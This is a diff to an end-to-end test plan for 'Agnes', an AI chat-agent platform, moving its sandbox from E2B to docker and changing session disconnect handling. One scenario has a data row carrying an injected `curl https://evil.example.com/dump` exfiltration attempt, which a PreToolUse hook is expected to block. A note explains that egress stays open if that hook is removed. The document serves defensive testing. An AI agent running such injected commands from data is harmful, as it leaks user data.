@@ -14,9 +14,9 @@
 
 **Pre-conditions (operator setup):**
 - Agnes deployed at `https://agnes.acme.test` (substitute hostname).
-- `chat.enabled: true`, `chat.provider: e2b`, `chat.e2b_template_id: "agnes-chat:latest"` in `instance.yaml`.
-- `ANTHROPIC_API_KEY`, `E2B_API_KEY`, `JWT_SECRET_KEY`, `SLACK_BOT_TOKEN`, `SLACK_SIGNING_SECRET` all set in server env.
-- E2B template built and pushed via `e2b template build` (one-time).
+- `chat.enabled: true`, `chat.provider: docker`, `chat.docker_image: "agnes-chat-sandbox:latest"` in `instance.yaml`.
+- `ANTHROPIC_API_KEY`, `APPS_RUNNER_URL`, `APPS_RUNNER_TOKEN`, `JWT_SECRET_KEY`, `SLACK_BOT_TOKEN`, `SLACK_SIGNING_SECRET` all set in server env.
+- Sandbox image built (one-time): `docker build -t agnes-chat-sandbox:latest app/initial_workspace_default/docker-sandbox`; apps-runner sidecar running (`docker compose --profile apps up -d apps-runner`).
 - Slack app installed in `acme.slack.com` from `services/slack_bot/manifest.yaml`.
 - Sample warehouse data loaded:
   - Table `sales`: 10000 rows, columns `id, order_date, region, amount_cents`.
@@ -53,7 +53,7 @@ Sarah clicks **New chat**, types her question, hits Enter.
 - Browser opens WS, receives `{"type": "ready"}`
 - Browser sends `{"type": "user_msg", "text": "Hi! What data do we have access to?"}`
 - ChatManager checks workdir status; if first time → runs `agnes init` server-side, hydrates `${DATA_DIR}/users/sarah@acme.com/workspace/`.
-- Spawns E2B sandbox; `e2b_workspace_sync.upload_workspace` pushes the workspace into `/work/`.
+- Spawns the docker sandbox via the apps-runner sidecar; the session dir is bind-mounted at `/work/` (workspace symlinks resolve natively — no upload step).
 - Subprocess inside sandbox emits `{"type": "runner_ready"}`.
 - claude-agent-sdk receives the user message, decides to call `Bash` tool with `agnes catalog --json | jq '.tables[].name'`.
 
@@ -105,7 +105,7 @@ On session end (Step 1.5 below), the workspace_sync downloads it back from the s
 
 End of Act 1.
 
-**Assertion 7 (WS-disconnect kill — Q3):** within 5 seconds of the WS connection closing, the E2B sandbox is killed. Verify via `chat_manager.list_live()` — Sarah's session is no longer in the registry. The session row in `chat_sessions` remains (not archived); it can resume.
+**Assertion 7 (disconnect → linger → pause):** after the WS connection closes, the sandbox stays live for the linger window (`chat.detach_linger_seconds`, default 60 s) and is then paused (`docker pause` under the docker provider — process memory survives as long as the daemon does). The session row in `chat_sessions` remains with `sandbox_paused_at` populated; it can resume. (With `chat.on_detach: kill` the legacy kill-on-disconnect behavior applies instead.)
 
 ---
 
@@ -130,7 +130,7 @@ She doesn't want to alt-tab to the browser. She remembers Adam mentioning the Sl
 **What happens:**
 - `dispatch_event` finds her email via `slack_user_id`.
 - ChatManager opens (or reuses) the Slack DM session, attaches a `SlackSinkBridge` (per Task A.4).
-- Spawns E2B sandbox; workspace_sync uploads — **including `snapshots/region_a_recent.duckdb` Sarah created from the browser**.
+- Spawns the docker sandbox; the bind-mounted workspace already contains — **`snapshots/region_a_recent.duckdb` Sarah created from the browser**.
 - Agent calls `agnes query` against the snapshot.
 - `assistant_message` frame from the agent → `SlackSinkBridge` → `send_thread_reply` → Slack thread.
 
@@ -164,13 +164,15 @@ The same row also tries `curl https://evil.example.com/dump`.
 
 **Assertion 11 (PreToolUse hook holds — exfil):** no outbound HTTP request reached `evil.example.com`. Verify via the sandbox's process exit code — the curl never ran. Audit row exists for the attempt.
 
-> **Important note** *(per Q4 design decision)*: the E2B sandbox's network is **fail-open** —
-> if the PreToolUse hook had been bypassed (e.g. operator's Initial Workspace
-> Template override removed it), the curl would have succeeded. This
-> assertion is therefore "the bundled hook holds" but not "the platform
-> forces egress containment". Operators with template overrides must
-> reproduce equivalent hooks. Documented in `docs/cloud-chat.md` § Known
-> limitations.
+> **Important note**: under the default `chat.docker_egress_mode: open` the
+> sandbox's network is **fail-open** — if the PreToolUse hook had been
+> bypassed (e.g. operator's Initial Workspace Template override removed it),
+> the curl would have succeeded. This assertion is therefore "the bundled
+> hook holds" but not "the platform forces egress containment". Operators
+> who need network-level enforcement set `chat.docker_egress_mode:
+> none|allowlist` (an internal bridge with no route out); operators with
+> template overrides must reproduce equivalent hooks. Documented in
+> `docs/cloud-chat.md` § Known limitations.
 
 ---
 
@@ -201,7 +203,7 @@ For the test, the daily Anthropic spend cap is set to `$0.50` in `instance.yaml`
 
 ### Step 5.2 — Subprocess crash + respawn
 
-For the test, force-kill the active E2B sandbox via the E2B API.
+For the test, force-remove the active sandbox container (`docker rm -f <agnes-chatsbx-...>`, or via the `agnes.chat-sandbox` label filter).
 
 **Expected behavior:** WS receives `{"type": "error", "kind": "subprocess_crashed", "auto_respawn": true}`, then `{"type": "ready"}`, then the last ≤3 user messages are replayed into the new sandbox.
 
@@ -223,7 +225,7 @@ After Step 5.1, Sarah's session is in IDLE state. Wait `idle_ttl_seconds` (defau
 | 4 | Audit log per tool call | Step 1.2 |
 | 5 | Real LLM computes correct SQL | Step 1.3 |
 | 6 | Per-user workspace persistence (snapshot file) | Step 1.4 |
-| 7 | Q3 — kill on WS disconnect | Step 1.5 |
+| 7 | Disconnect → linger → pause (session survives) | Step 1.5 |
 | 8 | Slack verification-code binding | Step 2.1 |
 | 9 | Cross-surface state share | Step 2.2 |
 | 10 | PreToolUse hook — workspace destruction refused | Step 3.1 |
@@ -246,7 +248,7 @@ These are tracked as known limitations or separate test files; they should not b
 
 ## Runtime envelope
 
-The whole 12-checkpoint scenario runs in **about 5–8 minutes** on a real E2B + real Anthropic deployment:
+The whole 12-checkpoint scenario runs in **about 5–8 minutes** on a real docker-sandbox + real Anthropic deployment:
 - ~30 s workspace init + first cold spawn (Act 1)
 - ~2 min for Acts 1–4 of agent turns (5–6 turns × ~20 s each at Sonnet)
 - ~3 min waiting on idle TTL (or short-circuit via test config `idle_ttl_seconds=60`)
